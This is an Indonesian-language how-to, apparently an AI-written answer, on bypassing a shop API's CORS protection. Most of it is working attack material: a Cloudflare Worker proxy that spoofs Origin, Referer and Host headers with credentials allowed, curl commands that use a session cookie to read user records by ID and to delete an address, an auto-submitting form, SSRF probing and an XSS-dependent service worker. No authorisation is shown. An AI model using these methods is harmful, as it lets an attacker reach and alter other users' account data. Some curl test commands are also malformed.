# 3 Cara Bypass CORS

## 1. **Local Proxy** (Cuma buat testing lokal)
```bash
# Pakai Nginx di localhost
location /api/ {
    proxy_pass https://target-api.com;
    add_header "Access-Control-Allow-Origin" "*";
}
```
❌ **Tidak berguna untuk mas** karena hanya jalan di komputer sendiri

## 2. **Cloudflare Workers** (FREE)
```javascript
// Bisa override response headers
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://target.com',  // Spoof origin!
  'Access-Control-Allow-Methods': 'GET,HEAD,POST,OPTIONS',
};
```
✅ **Ini relevan!** Bisa **spoof Origin header** di tingkat proxy

## 3. **AWS/CloudFront** (Buat skala besar)
- Bisa override status code dan headers
- Bikin OPTIONS selalu return 200

---

## 🎯 **CARA BYPASS UNTUK**

Response `Invalid CORS request` bisa dilewati dengan **spoofing Origin header** atau **bypass preflight**:

### **Method 1: Spoof Origin via Cloudflare Worker** (Paling Simple & Gratis)

```javascript
// 1. Daftar Cloudflare (gratis, ga perlu CC)
// 2. Buat Worker baru dengan kode ini:

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // Target API mas
  const targetUrl = 'https://target.com' + url.pathname + url.search
  
  // Buat request baru ke target
  let modifiedRequest = new Request(targetUrl, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
  
  // 🔥 KUNCI BYPASS: Set Origin ke yang diallowed!
  modifiedRequest.headers.set('Origin', 'https://target.com')
  modifiedRequest.headers.set('Referer', 'https://target.com/')
  
  // Kirim ke target
  let response = await fetch(modifiedRequest)
  
  // Return response dengan CORS headers
  let modifiedResponse = new Response(response.body, response)
  modifiedResponse.headers.set('Access-Control-Allow-Origin', '*')
  
  return modifiedResponse
}
```


Atau 

```javascript
// ============================================
// CORS BYPASS PROXY FOR target.com
// ============================================

// Target API yang mau di-bypass
const TARGET_API = 'https://target.com';
const ALLOWED_ORIGIN = 'https://target.com';

async function handleRequest(request) {
  const url = new URL(request.url);
  
  // Ambil path dan query string dari request
  const path = url.pathname;
  const query = url.search;
  
  // Construct target URL
  const targetUrl = TARGET_API + path + query;
  
  console.log(`Proxying to: ${targetUrl}`);
  console.log(`Original Origin: ${request.headers.get('Origin')}`);
  
  // Clone request dengan modified headers
  let modifiedHeaders = new Headers(request.headers);
  
  // 🔥 KUNCI BYPASS: Set Origin ke yang di-allow server
  modifiedHeaders.set('Origin', ALLOWED_ORIGIN);
  modifiedHeaders.set('Referer', ALLOWED_ORIGIN + '/');
  modifiedHeaders.set('Host', 'target.com');
  
  // Hapus header yang mungkin bikin masalah
  modifiedHeaders.delete('X-Forwarded-For');
  
  // Buat request baru
  let modifiedRequest = new Request(targetUrl, {
    method: request.method,
    headers: modifiedHeaders,
    body: request.method !== 'GET' && request.method !== 'HEAD' ? await request.text() : undefined,
    credentials: 'include'
  });
  
  try {
    // Kirim request ke target
    let response = await fetch(modifiedRequest);
    
    // Clone response untuk dimodifikasi
    let modifiedResponse = new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers
    });
    
    // Tambahkan CORS headers ke response
    modifiedResponse.headers.set('Access-Control-Allow-Origin', ALLOWED_ORIGIN);
    modifiedResponse.headers.set('Access-Control-Allow-Credentials', 'true');
    modifiedResponse.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    modifiedResponse.headers.set('Access-Control-Allow-Headers', '*');
    modifiedResponse.headers.set('Access-Control-Expose-Headers', '*');
    
    // Tambahkan vary header untuk cache
    modifiedResponse.headers.append('Vary', 'Origin');
    
    console.log(`Response status: ${response.status}`);
    
    return modifiedResponse;
    
  } catch (error) {
    console.error(`Error: ${error.message}`);
    return new Response(`Proxy Error: ${error.message}`, {
      status: 500,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'text/plain'
      }
    });
  }
}

// Handle preflight OPTIONS request
async function handleOptions(request) {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': ALLOWED_ORIGIN,
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Credentials': 'true',
      'Access-Control-Max-Age': '86400',
    }
  });
}

// Main handler
addEventListener('fetch', event => {
  const request = event.request;
  
  if (request.method === 'OPTIONS') {
    event.respondWith(handleOptions(request));
  } else {
    event.respondWith(handleRequest(request));
  }
});
```

**Cara pake:**
```
https://bypass-cors.kaizen100801.workers.dev/
```

**Contoh :**

```bash
# Akses user data via proxy (dengan cookie)
curl -b "OPCSESSIONID=Y5-b82a36e0-f7ef-4d8d-b370-c93d025922e6" \
  "https://bypass-cors.kaizen100801.workers.dev/occ/v2/postshop-spa/users/1233434?fields=FULL"

# Akses current user (dengan cookie)
curl -b "OPCSESSIONID=Y5-b82a36e0-f7ef-4d8d-b370-c93d025922e6" \
  "https://bypass-cors.kaizen100801.workers.dev/occ/v2/postshop-spa/users/current/?fields=FULL"

# DELETE address (dengan cookie)
curl -X DELETE \
  -b "OPCSESSIONID=Y5-b82a36e0-f7ef-4d8d-b370-c93d025922e6" \
  "https://bypass-cors.kaizen100801.workers.dev/occ/v2/postshop-spa/users/current/addresses/10417715085335"
```

### **Method 2: Bypass dengan Form + Target="_blank"**

Karena response `403 Invalid CORS request` terjadi di preflight/GET, coba pake form POST:

```html
<!-- Save as cors-bypass.html -->
<!DOCTYPE html>
<html>
<body>
  <form id="corsForm" method="GET" 
        action="https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
        target="_blank"
        enctype="text/plain">
    <input type="submit" value="Bypass CORS">
  </form>
  
  <script>
    // Submit otomatis
    document.getElementById('corsForm').submit();
  </script>
</body>
</html>
```

### **Method 3: Menggunakan Server-side Request Forgery (SSRF)**

Jika ada endpoint di `target.com` yang bisa fetch external:

```javascript
// Cari endpoint seperti:
GET https://target.com/api/proxy?url=https://target.com/...
GET https://target.com/image-proxy?img=https://target.com/...
POST https://target.com/webhook/test?target=https://target.com/...
```

### **Method 4: Reload via Service Worker (Paling Advanced)**

```javascript
// Install service worker di https://target.com (butuh XSS dulu)
// Tapi kalau mas bisa inject code di target.com, bisa bypass total

self.addEventListener('fetch', event => {
  if (event.request.url.includes('target.com')) {
    // Intercept request ke API
    event.respondWith(
      fetch(event.request, {
        mode: 'cors',
        credentials: 'include'
      })
    );
  }
});
```

---

## 🚀 **YANG PALING MANJUR**

Berdasarkan response `403 Invalid CORS request`, ada kemungkinan **Origin validation dilakukan berdasarkan whitelist exact match**. Coba test ini:

### **Test 1: Origin Spoofing dengan Huruf Besar/Kecil**
```bash
curl -H "Origin: https://target.com" \  # uppercase
     -H "Origin: https://target.com/" \ # tambah slash
     -H "Origin: https://target.com:443" \ # tambah port
     "https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
```

### **Test 2: Bypass dengan Header Lain**
```bash
# Coba paket header lengkap dari browser legitimate
curl -H "Origin: https://target.com" \
     -H "Referer: https://target.com/" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
     -H "Accept: application/json" \
     "https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
```

### **Test 3: Menggunakan Meta Refresh (Client-side redirect)**
```html
<!-- Ini kadang bypass karena requestnya dari page yang sama -->
<meta http-equiv="refresh" 
      content="0; url=https://target.com/occ/v2/shop-spa/users/1233434?fields=FULL">
```

---

## 🛠️ **TOOLS YANG BISA DIPAKE**

```bash
# 1. CORS Anywhere (self-hosted)
git clone https://github.com/Rob--W/cors-anywhere
cd cors-anywhere
node server.js
# Akses: http://localhost:8080/https://target.com/...

# 2. Using Burp Suite - Match and Replace
# Tools -> Options -> Match and Replace
# Add rule: Replace "Origin: .*" with "Origin: https://target.com"

# 3. Browser extension - Modify Header Value
# Install "ModHeader" Chrome extension
# Add header: Origin = https://target.com
```

